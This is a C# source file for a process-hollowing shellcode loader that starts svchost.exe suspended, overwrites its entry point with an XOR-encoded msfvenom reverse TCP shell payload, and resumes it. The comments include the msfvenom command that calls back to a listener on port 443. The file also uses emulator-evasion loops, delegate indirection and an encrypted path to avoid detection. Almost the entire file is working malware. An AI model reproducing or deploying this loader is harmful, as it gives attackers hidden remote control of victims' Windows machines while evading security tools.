using HollowGhostEncPath.Modules.Crypt;
using HollowGhostEncPath.Modules.Evasion;
using System;
using System.Runtime.InteropServices;

namespace HollowGhostEncPath
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        // Custom delegate functions for the DLL imports
        private delegate bool M1(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        private delegate int M2(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        private delegate bool M3(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        private delegate bool M4(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate uint M5(IntPtr hThread);

        // Create delegate instances
        private static M1 F1;
        private static M2 F2;
        private static M3 F3;
        private static M4 F4;
        private static M5 F5;

        private static string iv;
        private static string encryptionKey;


        static void Main(string[] args)
        {
            // Initialize delegate instances with the original DLL functions
            F1 = CreateProcess;
            F2 = ZwQueryInformationProcess;
            F3 = ReadProcessMemory;
            F4 = WriteProcessMemory;
            F5 = ResumeThread;

            // Generate a dynamic encryption key
            encryptionKey = FilepathEncryptor.GenerateRandomKey(32); // Use an appropriate key size
            iv = FilepathEncryptor.GenerateRandomIV(); // Generate a random IV

            // Plain-text file path
            string plainTextPath = "C:\\Windows\\System32\\svchost.exe";

            // Encrypt the plain-text file path using the dynamic encryption key and IV
            string encryptedPath = FilepathEncryptor.Encrypt(plainTextPath, encryptionKey, iv);

            // Run sandbox/emulation evasion first before executing our shellcode

            // Perform many iterations of for loop, 900 million, to trip up emulator
            Evasion.MI();

            // After evasion is performed, we finally call the runner
            Run(encryptedPath);

        }

        static void Run(string encryptedPath)
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Decrypt the file path before using it
            string path = FilepathEncryptor.Decrypt(encryptedPath, encryptionKey, iv);

            bool res = F1(null, path, IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            F2(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            F3(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            F3(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // Generate XOR shellcode with MSFVenom: msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
            byte[] buf = new byte[511] { 0x86, 0x32, 0xf9, 0x9e, 0x8a, 0x92, 0xb6, 0x7a, 0x7a, 0x7a, 0x3b, 0x2b, 0x3b, 0x2a, 0x28, 0x2b, 0x2c, 0x32, 0x4b, 0xa8, 0x1f, 0x32, 0xf1, 0x28, 0x1a, 0x32, 0xf1, 0x28, 0x62, 0x32, 0xf1, 0x28, 0x5a, 0x32, 0x75, 0xcd, 0x30, 0x30, 0x37, 0x4b, 0xb3, 0x32, 0xf1, 0x08, 0x2a, 0x32, 0x4b, 0xba, 0xd6, 0x46, 0x1b, 0x06, 0x78, 0x56, 0x5a, 0x3b, 0xbb, 0xb3, 0x77, 0x3b, 0x7b, 0xbb, 0x98, 0x97, 0x28, 0x32, 0xf1, 0x28, 0x5a, 0x3b, 0x2b, 0xf1, 0x38, 0x46, 0x32, 0x7b, 0xaa, 0x1c, 0xfb, 0x02, 0x62, 0x71, 0x78, 0x75, 0xff, 0x08, 0x7a, 0x7a, 0x7a, 0xf1, 0xfa, 0xf2, 0x7a, 0x7a, 0x7a, 0x32, 0xff, 0xba, 0x0e, 0x1d, 0x32, 0x7b, 0xaa, 0xf1, 0x32, 0x62, 0x2a, 0x3e, 0xf1, 0x3a, 0x5a, 0x33, 0x7b, 0xaa, 0x99, 0x2c, 0x37, 0x4b, 0xb3, 0x32, 0x85, 0xb3, 0x3b, 0xf1, 0x4e, 0xf2, 0x32, 0x7b, 0xac, 0x32, 0x4b, 0xba, 0xd6, 0x3b, 0xbb, 0xb3, 0x77, 0x3b, 0x7b, 0xbb, 0x42, 0x9a, 0x0f, 0x8b, 0x36, 0x79, 0x36, 0x5e, 0x72, 0x3f, 0x43, 0xab, 0x0f, 0xa2, 0x22, 0x3e, 0xf1, 0x3a, 0x5e, 0x33, 0x7b, 0xaa, 0x1c, 0x3b, 0xf1, 0x76, 0x32, 0x3e, 0xf1, 0x3a, 0x66, 0x33, 0x7b, 0xaa, 0x3b, 0xf1, 0x7e, 0xf2, 0x3b, 0x22, 0x32, 0x7b, 0xaa, 0x3b, 0x22, 0x24, 0x23, 0x20, 0x3b, 0x22, 0x3b, 0x23, 0x3b, 0x20, 0x32, 0xf9, 0x96, 0x5a, 0x3b, 0x28, 0x85, 0x9a, 0x22, 0x3b, 0x23, 0x20, 0x32, 0xf1, 0x68, 0x93, 0x31, 0x85, 0x85, 0x85, 0x27, 0x33, 0xc4, 0x0d, 0x09, 0x48, 0x25, 0x49, 0x48, 0x7a, 0x7a, 0x3b, 0x2c, 0x33, 0xf3, 0x9c, 0x32, 0xfb, 0x96, 0xda, 0x7b, 0x7a, 0x7a, 0x33, 0xf3, 0x9f, 0x33, 0xc6, 0x78, 0x7a, 0x7b, 0xc1, 0xba, 0xd2, 0x7b, 0x78, 0x3b, 0x2e, 0x33, 0xf3, 0x9e, 0x36, 0xf3, 0x8b, 0x3b, 0xc0, 0x36, 0x0d, 0x5c, 0x7d, 0x85, 0xaf, 0x36, 0xf3, 0x90, 0x12, 0x7b, 0x7b, 0x7a, 0x7a, 0x23, 0x3b, 0xc0, 0x53, 0xfa, 0x11, 0x7a, 0x85, 0xaf, 0x10, 0x70, 0x3b, 0x24, 0x2a, 0x2a, 0x37, 0x4b, 0xb3, 0x37, 0x4b, 0xba, 0x32, 0x85, 0xba, 0x32, 0xf3, 0xb8, 0x32, 0x85, 0xba, 0x32, 0xf3, 0xbb, 0x3b, 0xc0, 0x90, 0x75, 0xa5, 0x9a, 0x85, 0xaf, 0x32, 0xf3, 0xbd, 0x10, 0x6a, 0x3b, 0x22, 0x36, 0xf3, 0x98, 0x32, 0xf3, 0x83, 0x3b, 0xc0, 0xe3, 0xdf, 0x0e, 0x1b, 0x85, 0xaf, 0xff, 0xba, 0x0e, 0x70, 0x33, 0x85, 0xb4, 0x0f, 0x9f, 0x92, 0xe9, 0x7a, 0x7a, 0x7a, 0x32, 0xf9, 0x96, 0x6a, 0x32, 0xf3, 0x98, 0x37, 0x4b, 0xb3, 0x10, 0x7e, 0x3b, 0x22, 0x32, 0xf3, 0x83, 0x3b, 0xc0, 0x78, 0xa3, 0xb2, 0x25, 0x85, 0xaf, 0xf9, 0x82, 0x7a, 0x04, 0x2f, 0x32, 0xf9, 0xbe, 0x5a, 0x24, 0xf3, 0x8c, 0x10, 0x3a, 0x3b, 0x23, 0x12, 0x7a, 0x6a, 0x7a, 0x7a, 0x3b, 0x22, 0x32, 0xf3, 0x88, 0x32, 0x4b, 0xb3, 0x3b, 0xc0, 0x22, 0xde, 0x29, 0x9f, 0x85, 0xaf, 0x32, 0xf3, 0xb9, 0x33, 0xf3, 0xbd, 0x37, 0x4b, 0xb3, 0x33, 0xf3, 0x8a, 0x32, 0xf3, 0xa0, 0x32, 0xf3, 0x83, 0x3b, 0xc0, 0x78, 0xa3, 0xb2, 0x25, 0x85, 0xaf, 0xf9, 0x82, 0x7a, 0x07, 0x52, 0x22, 0x3b, 0x2d, 0x23, 0x12, 0x7a, 0x3a, 0x7a, 0x7a, 0x3b, 0x22, 0x10, 0x7a, 0x20, 0x3b, 0xc0, 0x71, 0x55, 0x75, 0x4a, 0x85, 0xaf, 0x2d, 0x23, 0x3b, 0xc0, 0x0f, 0x14, 0x37, 0x1b, 0x85, 0xaf, 0x33, 0x85, 0xb4, 0x93, 0x46, 0x85, 0x85, 0x85, 0x32, 0x7b, 0xb9, 0x32, 0x53, 0xbc, 0x32, 0xff, 0x8c, 0x0f, 0xce, 0x3b, 0x85, 0x9d, 0x22, 0x10, 0x7a, 0x23, 0xc1, 0x9a, 0x67, 0x50, 0x70, 0x3b, 0xf3, 0xa0, 0x85, 0xaf };

            // XOR decrypt, key is set to 'z'
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'z');
            }

            F4(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            F5(pi.hThread);
        }
    }
}
